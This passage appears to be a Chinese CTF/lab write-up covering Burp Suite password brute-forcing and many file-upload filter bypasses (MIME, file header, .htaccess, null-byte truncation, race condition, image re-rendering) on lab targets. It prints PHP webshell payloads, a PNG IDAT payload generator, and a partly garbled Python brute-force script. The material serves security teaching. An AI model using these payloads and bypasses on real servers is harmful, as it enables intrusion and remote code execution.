爆破</h3><p>将密码加密 base64 加密<br>BP <strong>迭代器</strong>，账号:密码  有效载荷选项 和 有效负荷处理</p><h3 id="5-前端加密爆破"><a href="#5-前端加密爆破" class="headerlink" title="5.前端加密爆破"></a>5.前端加密爆破</h3><ul><li>原理：把前端加密 md5 放进数据库<br>BP 有效负荷处理 添加HASH 的md5 加密 然后再攻击</li></ul><h3 id="6-泄露数据库撞库"><a href="#6-泄露数据库撞库" class="headerlink" title="6.泄露数据库撞库"></a>6.泄露数据库撞库</h3><ul><li>BP使用<br><strong>音叉攻击 Pichfork</strong>：是用户名与密码一一对应的进行爆破</li></ul><h3 id="7-泄露数据库撞库-2"><a href="#7-泄露数据库撞库-2" class="headerlink" title="7.泄露数据库撞库-2"></a>7.泄露数据库撞库-2</h3><ul><li>BP使用<br><strong>音叉攻击 Pichfork，paylode处理hash md5加密</strong></li></ul><h3 id="8-返回包提取爆破"><a href="#8-返回包提取爆破" class="headerlink" title="8.返回包提取爆破"></a>8.返回包提取爆破</h3><p>正确错误<strong>返回密码长度都相同</strong>时， 在Options中选择<strong>Extract</strong> ，添加返回<strong>选中</strong></p><h3 id="9-简单的-token-验证"><a href="#9-简单的-token-验证" class="headerlink" title="9.简单的 token 验证"></a>9.简单的 token 验证</h3><ul><li>token 时间戳形式<br>时间戳 BP 不能写时间戳 需要手动写脚本<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    m=hashlib.md5()</span><br><span class="line">    m.update(<span class="built_in">str</span>.encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    url =<span class="string">&quot;http://10.20.24.244/&quot;</span> headers =</span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;10.20.24.244&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type1: &#x27;</span>application/x-ww-form-urlencoded<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;</span>User-Agent<span class="string">&#x27;:&#x27;</span>Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>;Win64;x64)AppleWebKit/<span class="number">537.36</span> (KHTML,like</span><br><span class="line">&#125;</span><br><span class="line">payloads=<span class="built_in">open</span>(<span class="string">&quot;pass,txt&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">    data =<span class="string">f&quot;username=admin&amp;password=<span class="subst">&#123;payload&amp;token=&#123;md5(<span class="built_in">str</span>(<span class="built_in">int</span>(time.tihe())))y<span class="string">&quot; </span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">    r = requests.post(url=url, headers=headers, data=data)</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">    if&#x27;flag&#123;&#x27;in r.text:</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">        print(f&quot;</span>\033[<span class="number">32</span>;1m[+] success &#123;data&#125;</span>\033[0m&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\033[1;34m[*] attack<span class="subst">&#123;data&#125;</span>\033[0m&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul><h3 id="10-没有简单的弱口令"><a href="#10-没有简单的弱口令" class="headerlink" title="10.没有简单的弱口令"></a>10.没有简单的弱口令</h3><p>验证码只能用一次   验证码爆破 </p><ul><li>利用burp的插件来进行验证码识别爆破</li><li>用captcha-killer插件，开源地址:<a href="https://github.com/cOny1/captcha-killer">https://github.com/cOny1/captcha-killer</a></li><li>工具 ：pkavhttpfuzzer  爱盘BP 1.7  captcha</li></ul><ol><li>将测试包粘贴到工具中 添加字典 </li><li>添加验证码标记 写入验证码地址</li><li>验证码识别重放模式：单线程</li></ol><hr><h1 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h1><p><a href="https://image.3001.net/images/20201025/16035981315620.png"><img src="https://image.3001.net/images/20201025/16035981315620.png" alt="img"></a></p><p>如何判断是否是前端验证呢？首先抓包监听，如果上传文件的时候还没有抓取到数据包，但是浏览器就提示文件类型不正确的话，那么这个多半就是前端校验了：</p><p><a href="https://image.3001.net/images/20201025/16036095176123.png"><img src="https://image.3001.net/images/20201025/16036095176123.png" alt="img"></a></p><h2 id="解法一：抓包"><a href="#解法一：抓包" class="headerlink" title="解法一：抓包"></a>解法一：抓包</h2><p>因为是前段验证的问题，可以直接将 shell.php 重命名为 shell.png 上传抓包的时候再将文件名修改为 shell.php 即可绕过前段限制，成功上传 webshell。</p><h2 id="解法二：禁用-JS"><a href="#解法二：禁用-JS" class="headerlink" title="解法二：禁用 JS"></a>解法二：禁用 JS</h2><p>因为 JS 来校验文件后缀的原因，所以可以直接在浏览器上禁用 JS 这样就可以直接上传文件了。Chrome 内核的浏览器在审查元素的状态下可以找到 Settings 选项，然后找到 「Debugger」 选项下面直接勾选 「Disable JavaScript」即可。</p><h2 id="解法三：调试-JS"><a href="#解法三：调试-JS" class="headerlink" title="解法三：调试 JS"></a>解法三：调试 JS</h2><p>这种解法就类似于孔乙己中的茴香豆的 「茴」有几种写法？，纯粹就是为了炫技，但是并不实用，那么国光下面就简单说下调试 JS 的过程吧。</p><p>首先审查元素下下断点：</p><p><a href="https://image.3001.net/images/20201025/16036082412704.png"><img src="https://image.3001.net/images/20201025/16036082412704.png" alt="img"></a></p><p>单行单步调试，找到 <code>whitelist</code> 变量，双击元素然后直接修改数组元素的值 ：</p><p><a href="https://image.3001.net/images/20201025/16036087605888.png"><img src="https://image.3001.net/images/20201025/16036087605888.png" alt="img"></a></p><p>放掉数据包，之前的 shell.php 可直接上传成功：</p><p><a href="https://image.3001.net/images/20201025/1603608623108.png"><img src="https://image.3001.net/images/20201025/1603608623108.png" alt="img"></a></p><p>成功拿到根目录下的 flag：</p><p><a href="https://image.3001.net/images/20201025/16036086662827.png"><img src="https://image.3001.net/images/20201025/16036086662827.png" alt="img"></a></p><h1 id="MIME"><a href="#MIME" class="headerlink" title="MIME"></a>MIME</h1><p>这样下去感觉上课都不需要 PPT 了，关键姿势点都直接贴在了题目中了：</p><p><a href="https://image.3001.net/images/20201025/16036091167949.png"><img src="https://image.3001.net/images/20201025/16036091167949.png" alt="img"></a></p><p>因为提示了 MIME 类型校验，所以抓取上传的数据包然后直接修改 <code>Content-Type</code> 类型为：<code>image/png</code> 等合法的类型即可：</p><p><a href="https://image.3001.net/images/20201026/1603684549564.png"><img src="https://image.3001.net/images/20201026/1603684549564.png" alt="img"></a></p><h1 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h1><p>本题配图中里面包含了 GIF89a 已经很明显了，答案就在题目中：</p><p><a href="https://image.3001.net/images/20201025/16036097871368.png"><img src="https://image.3001.net/images/20201025/16036097871368.png" alt="img"></a></p><p>本题校验了图片的文件头也就是校验图片内容的，这个时候使用一个标准的图马是可以成功绕过的，由于国光的这个代码只校验了前面几个字节，所以直接写 GIF89a 即可成功绕过：</p><p><a href="https://image.3001.net/images/20201026/16036846031002.png"><img src="https://image.3001.net/images/20201026/16036846031002.png" alt="img"></a></p><h1 id="缺陷的代码-1"><a href="#缺陷的代码-1" class="headerlink" title="缺陷的代码 - 1"></a>缺陷的代码 - 1</h1><p>本题的图片上的第 2 行代码是一个有缺陷的代码，黑名单关键词替换为空的操作是一种不安全的写法：</p><p><a href="https://image.3001.net/images/20201025/16036102265581.png"><img src="https://image.3001.net/images/20201025/16036102265581.png" alt="img"></a></p><p>因为代码开发者的错误写法，这种情况下可以直接使用嵌套后缀绕过：</p><p><a href="https://image.3001.net/images/20201026/16036846312806.png"><img src="https://image.3001.net/images/20201026/16036846312806.png" alt="img"></a></p><h1 id="缺陷的代码-2"><a href="#缺陷的代码-2" class="headerlink" title="缺陷的代码 - 2"></a>缺陷的代码 - 2</h1><p>本地属于理论上漏洞，因为题目环境是 Docker 容器运行的 Linux 系统，所以本题国光修改成了 Windows 的特性</p><p><a href="https://image.3001.net/images/20201025/1603610505374.png"><img src="https://image.3001.net/images/20201025/1603610505374.png" alt="img"></a></p><p>同理图片提示中的第 2 行代码也是有缺陷的，可以仅用了 <code>str_replace</code> 替换，这样很容易就被大小写绕过，因为 Windows 环境下不区分大小写，所以就可以让 .PHp 当做 .php 来解析了，但是 Linux 下这种大小写如果的话完全没作用，所以本题是国光自己造的漏洞，用来伪造 Windows 环境下的大小写不区分的情况：</p><p><a href="https://image.3001.net/images/20201026/1603684654836.png"><img src="https://image.3001.net/images/20201026/1603684654836.png" alt="img"></a></p><h1 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h1><p>本题同样题目的配图中暗示已经比较明显了，默认情况下 Apache 把 phtml、pht、php、php3、php4、php5 解析为 PHP：</p><p><a href="https://image.3001.net/images/20201025/16036116763150.png"><img src="https://image.3001.net/images/20201025/16036116763150.png" alt="img"></a></p><p>那么这里 Fuzz 一下，发现这些稍微冷门的后缀都可以直接绕过：</p><p><a href="https://image.3001.net/images/20201026/16036846759511.png"><img src="https://image.3001.net/images/20201026/16036846759511.png" alt="img"></a></p><h1 id="解析规则"><a href="#解析规则" class="headerlink" title="解析规则"></a>解析规则</h1><p>本题的暗示也已经很明显了，只要选手查询 htaccess 怎么解析的话，就可以很顺利的解题：</p><p><a href="https://image.3001.net/images/20201025/160361194314.png"><img src="https://image.3001.net/images/20201025/160361194314.png" alt="img"></a></p><p>因为题目是考擦 htaccess 这个上传知识点，所以先准备一个解析规则：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> .htaccess</span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure><p>然后先上传这个 .htaccess 文件到服务器的 upload 目录下：</p><p><a href="https://image.3001.net/images/20201026/16036846984498.png"><img src="https://image.3001.net/images/20201026/16036846984498.png" alt="img"></a></p><p>这表示将 upload 目录下的所有 png 图片都当做 php 来解析，然后再上传一个 shell.png 即可：</p><p><a href="https://image.3001.net/images/20201026/16036847615642.png"><img src="https://image.3001.net/images/20201026/16036847615642.png" alt="img"></a></p><p>此时这个 shell.png 就已经被当做 PHP 解析了：</p><p><a href="https://image.3001.net/images/20201025/16036122801854.png"><img src="https://image.3001.net/images/20201025/16036122801854.png" alt="img"></a></p><h1 id="古老的漏洞-1"><a href="#古老的漏洞-1" class="headerlink" title="古老的漏洞 - 1"></a>古老的漏洞 - 1</h1><p>本题依然在题目中科普了 00 截断是啥，以及 00 截断的利用条件：</p><p><a href="https://image.3001.net/images/20201025/16036124585228.png"><img src="https://image.3001.net/images/20201025/16036124585228.png" alt="img"></a></p><p>00 截断多配合路径来截断，我们来抓包看看应该是存在路径信息的，然后直接在路径后面使用 %00 来截断一下就可以成功绕过，为啥 %00 直接就可以绕过了呢？这是因为路径信息是从 GET 方式传递个后端的，这样默认会进行一次 URL 解码，%00 解码后就是空字节：</p><p><a href="https://image.3001.net/images/20201026/16036847876825.png"><img src="https://image.3001.net/images/20201026/16036847876825.png" alt="img"></a></p><p>这样保存的文件名就是这样的效果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/apache2/htdocs/upload/new.php%00shell.png</span><br></pre></td></tr></table></figure><p>因为 <code>%00</code> 起到截断的作用，所以最终会在 upload 目录下面生成 new.php 的 webshell</p><p><a href="https://image.3001.net/images/20201025/16036127173608.png"><img src="https://image.3001.net/images/20201025/16036127173608.png" alt="img"></a></p><h1 id="古老的漏洞-2"><a href="#古老的漏洞-2" class="headerlink" title="古老的漏洞 - 2"></a>古老的漏洞 - 2</h1><p>国光这一题偷懒了，没有换题目外观，不过选手们抓包就会发现这是一个 POST 型的 00 截断：</p><p><a href="https://image.3001.net/images/20201025/16036129575787.png"><img src="https://image.3001.net/images/20201025/16036129575787.png" alt="img"></a></p><p>既然是 POST 型 00 截断那么就直接抓包吧，需要在 BP 里面写一个 %00 然后再 URL 手动解码一下：</p><p><a href="https://image.3001.net/images/20201025/16036131049530.png"><img src="https://image.3001.net/images/20201025/16036131049530.png" alt="img"></a></p><h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><p>本题是一个条件竞争漏洞，也在题目中给了关键的功能代码贴图，以及给了解题思路了：</p><p><a href="https://image.3001.net/images/20201025/16036135842482.png"><img src="https://image.3001.net/images/20201025/16036135842482.png" alt="img"></a></p><p>条件竞争的话稍微和正常的上传姿势不一样，先把题目中给的 webshell 信息复制出来备用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;xiao.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后先上传 shell.php 文件：</p><p><a href="https://image.3001.net/images/20201026/16036848394730.png"><img src="https://image.3001.net/images/20201026/16036848394730.png" alt="img"></a></p><p>BP 抓取这个数据包然后发送到 Intruder 测试器中使用 NULL 空值无限爆破：</p><p><a href="https://image.3001.net/images/20201025/16036138407749.png"><img src="https://image.3001.net/images/20201025/16036138407749.png" alt="img"></a></p><p>然后抓取访问 shell.php 的数据包：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTPGET /upload/shell.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: vul.xps.com:<span class="number">30009</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.14</span>; rv:<span class="number">56.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">56.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br></pre></td></tr></table></figure><p>依然使用 NULL 空值爆破：</p><p><a href="https://image.3001.net/images/20201025/16036140058678.png"><img src="https://image.3001.net/images/20201025/16036140058678.png" alt="img"></a></p><p>最后成功在服务器的 upload 目录下生成 xiao.php 里的内容就是一个标准的 webshell：</p><p><a href="https://image.3001.net/images/20201025/16036153403524.png"><img src="https://image.3001.net/images/20201025/16036153403524.png" alt="img"></a></p><h1 id="move-uploaded-file-缺陷"><a href="#move-uploaded-file-缺陷" class="headerlink" title="move_uploaded_file 缺陷"></a>move_uploaded_file 缺陷</h1><p>这一题取材于 upload-labs 后面新增的题目：</p><p><a href="https://image.3001.net/images/20201025/1603615449643.png"><img src="https://image.3001.net/images/20201025/1603615449643.png" alt="img"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)</span><br></pre></td></tr></table></figure><p>当 <code>$img_path</code> 可控的时候，还会忽略掉 <code>$img_path</code> 后面的 <code>/.</code> ，这一点发现最早是 <a href="https://www.smi1e.top/">Smile</a> 师傅于 2019 年 2 月份提出来的，TQL !!! 既然知道 move_uploaded_file 的这个小缺陷的话，这样既可直接 Getshell：</p><p><a href="https://image.3001.net/images/20201025/16036161031022.png"><img src="https://image.3001.net/images/20201025/16036161031022.png" alt="img"></a></p><h1 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h1><p><code>imagecreatefrom</code> 系列渲染图片都可能被绕过，有些特殊的图马是可以逃避过渲染的，另外这一题我特意还给了查看提示的按钮：</p><p><a href="https://image.3001.net/images/20201025/1603616269318.png"><img src="https://image.3001.net/images/20201025/1603616269318.png" alt="img"></a></p><p>点击这个查看提示会出现如下页面：</p><p><a href="https://image.3001.net/images/20201025/16036164852192.png"><img src="https://image.3001.net/images/20201025/16036164852192.png" alt="img"></a></p><p>注意 URL 发生了变化，没错这里是一个文件包含漏洞，这样包含选手们逃避渲染上传后的图片的话就可以直接 getshell 了：</p><p><a href="https://image.3001.net/images/20201025/16036165628118.png"><img src="https://image.3001.net/images/20201025/16036165628118.png" alt="img"></a></p><p>接下来要总结一下二次渲染的细节了，这也是耗费时间写本文的主要动力之一，因为上面的那些知识点都比较常规，这个二次渲染的细节国光我一直都没有深入总结过，正好就放这里总结一下。</p><h2 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h2><p>渲染前后的两张 GIF，没有发生变化的数据库部分直接插入 Webshell 即可</p><p>首先准备一张迷你的 GIF</p><p><a href="https://image.3001.net/images/20201025/16036176592096.gif"><img src="https://image.3001.net/images/20201025/16036176592096.gif" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201025/16036252666623.gif"><img src="https://image.3001.net/images/20201025/16036252666623.gif" alt="img"></a></p><p>使用 010Editor 打开这两个文件，在 「Tools」选项下面找到「Compare Files」即可对比两个文件内容：</p><p><a href="https://image.3001.net/images/20201025/1603625929446.png"><img src="https://image.3001.net/images/20201025/1603625929446.png" alt="img"></a></p><p>对比的效果如下，其中灰的部分就是内容一致的部分：</p><p><a href="https://image.3001.net/images/20201025/16036266297353.png"><img src="https://image.3001.net/images/20201025/16036266297353.png" alt="img"></a></p><p>那么只需要将 PHP 代码插入到灰色的部分即可：</p><p><a href="https://image.3001.net/images/20201025/16036267273505.png"><img src="https://image.3001.net/images/20201025/16036267273505.png" alt="img"></a></p><p>修改后的 gif 图片如下：</p><p><a href="https://image.3001.net/images/20201025/16036267469060.gif"><img src="https://image.3001.net/images/20201025/16036267469060.gif" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201025/16036268187614.gif"><img src="https://image.3001.net/images/20201025/16036268187614.gif" alt="img"></a></p><p>此时查看一下发现我们的 payload 内容依然存在：</p><p><a href="https://image.3001.net/images/20201026/16036850183974.png"><img src="https://image.3001.net/images/20201026/16036850183974.png" alt="img"></a></p><h2 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h2><p>PNG 没有 GIF 那么简单，需要将数据写入到 PLTE 数据块 或者 IDAT 数据块。首先准备一个 PNG 图片：</p><p><a href="https://image.3001.net/images/20201025/16036276956867.png"><img src="https://image.3001.net/images/20201025/16036276956867.png" alt="img"></a></p><p>两次渲染后对比一下，发现除了 PNG 文件头，其他部分全都不一致：</p><p><a href="https://image.3001.net/images/20201025/16036285349399.png"><img src="https://image.3001.net/images/20201025/16036285349399.png" alt="img"></a></p><p>看来使用 GIF 那种思路是行不通的了。PNG 的解决方法继续往下面看。</p><h3 id="写入-PLTE-数据块"><a href="#写入-PLTE-数据块" class="headerlink" title="写入 PLTE 数据块"></a>写入 PLTE 数据块</h3><p>关于实现细节以前乌云知识库的一篇文章写的很详细，感兴趣的朋友可以阅读看看：</p><p><a href="https://wooyun.x10sec.org/static/drops/tips-16034.html">WooYun 乌云 - php imagecreatefrom* 系列函数之 png</a></p><p>写入 PLTE 数据块并不是对所有的 PNG 图片都是可行的，实验证明只有索引图像才可以成功插入 payload，灰度和真彩色图像均以失败告终。</p><p>修改索引图像插入 PHP 代码的脚本项目地址为：<a href="https://github.com/hxer/imagecreatefrom-/blob/master/png/poc/poc_png.py">Github - poc_png.py</a></p><p>因为值有索引图像的 PNG 才可能插入 PLTE 数据块，但是我们上面准备的 PNG 并不符合要求，得需要在 PS 里面将图片模式修改为索引颜色：</p><p><a href="https://image.3001.net/images/20201025/16036303454787.png"><img src="https://image.3001.net/images/20201025/16036303454787.png" alt="img"></a></p><p>修改的索引图片如下：</p><p><a href="https://image.3001.net/images/20201025/16036304687175.png"><img src="https://image.3001.net/images/20201025/16036304687175.png" alt="img"></a></p><p>然后使用 Python2 运行脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc_png.py -p <span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span> -o gg_shell.png old.png</span><br></pre></td></tr></table></figure><p>生成新的 gg_shell.png 图片如下：</p><p><a href="https://image.3001.net/images/20201025/1603630522797.png"><img src="https://image.3001.net/images/20201025/1603630522797.png" alt="img"></a></p><p>这个图片是带 payload 的：</p><p><a href="https://image.3001.net/images/20201025/16036306183035.png"><img src="https://image.3001.net/images/20201025/16036306183035.png" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201025/16036307974999.png"><img src="https://image.3001.net/images/20201025/16036307974999.png" alt="img"></a></p><p>来检测一下我们的 payload 是否还存在了：</p><p><a href="https://image.3001.net/images/20201025/16036344921925.png"><img src="https://image.3001.net/images/20201025/16036344921925.png" alt="img"></a></p><p>哎貌似不对劲：</p><p><a href="https://image.3001.net/images/20201025/16036345974560.png"><img src="https://image.3001.net/images/20201025/16036345974560.png" alt="img"></a></p><p>这个字符串被渲染后貌似是顺序有点奇怪。这里国光踩了很多坑，查了很多资料网上都没有好的解决方案，最后国光<strong>将这个被目标网站渲染后的图片再上传渲染</strong>，下面是渲染后的图片：</p><p><a href="https://image.3001.net/images/20201025/16036348898441.png"><img src="https://image.3001.net/images/20201025/16036348898441.png" alt="img"></a></p><p>赶紧来查看一下里面是否包含图马信息：</p><p><a href="https://image.3001.net/images/20201025/16036348742287.png"><img src="https://image.3001.net/images/20201025/16036348742287.png" alt="img"></a></p><p>阿这！居然成功了，真的是功夫不负有心人呐，不枉国光我周末大半夜的在公司加班写的这篇文章了！！！泪目</p><h3 id="写入-IDAT-数据块"><a href="#写入-IDAT-数据块" class="headerlink" title="写入 IDAT 数据块"></a>写入 IDAT 数据块</h3><p>PNG 也是可以写入 IDAT 数据来绕过渲染的，由于快 23.00 了国光没有多余的时间研究里面细节了，这里直接引用了先知里面提供的一个脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./shell.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接运行生成会在脚本目录下生成 shell.png 图片，下面是生成好的 图片：</p><p><a href="https://image.3001.net/images/20201025/16036353722974.png"><img src="https://image.3001.net/images/20201025/16036353722974.png" alt="img"></a></p><p>其内容如下：</p><p><a href="https://image.3001.net/images/20201025/16036354976650.png"><img src="https://image.3001.net/images/20201025/16036354976650.png" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201025/16036356271476.png"><img src="https://image.3001.net/images/20201025/16036356271476.png" alt="img"></a></p><p>查看一下里面的 payload 是否还存在：</p><p><a href="https://image.3001.net/images/20201025/16036357015967.png"><img src="https://image.3001.net/images/20201025/16036357015967.png" alt="img"></a></p><p>依然存在的，成功绕过渲染 ，这里顺便提一下这个 shell 的使用方法，下面就不再补充了。</p><p>首先获取图片的上传地址为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vul.xps.com:30010/upload/357481464.png</span><br></pre></td></tr></table></figure><p><a href="https://image.3001.net/images/20201025/1603635794598.png"><img src="https://image.3001.net/images/20201025/1603635794598.png" alt="img"></a></p><p>利用网站本身的文件包含漏洞，尝试直接包含这个图马 ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vul.xps.com:30010/?file=./upload/357481464.png</span><br></pre></td></tr></table></figure><p><a href="https://image.3001.net/images/20201025/16036358617110.png"><img src="https://image.3001.net/images/20201025/16036358617110.png" alt="img"></a></p><p>貌似成功了，执行命令看看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vul.xps.com:30010/?0=system&amp;file=./upload/357481464.png</span><br></pre></td></tr></table></figure><p>POST 内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=<span class="built_in">cat</span> /f14a4a4a4a444g</span><br></pre></td></tr></table></figure><p><a href="https://image.3001.net/images/20201025/16036360607524.png"><img src="https://image.3001.net/images/20201025/16036360607524.png" alt="img"></a></p><h2 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h2><p>JPG 也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试。</p><p>这个脚本 Github 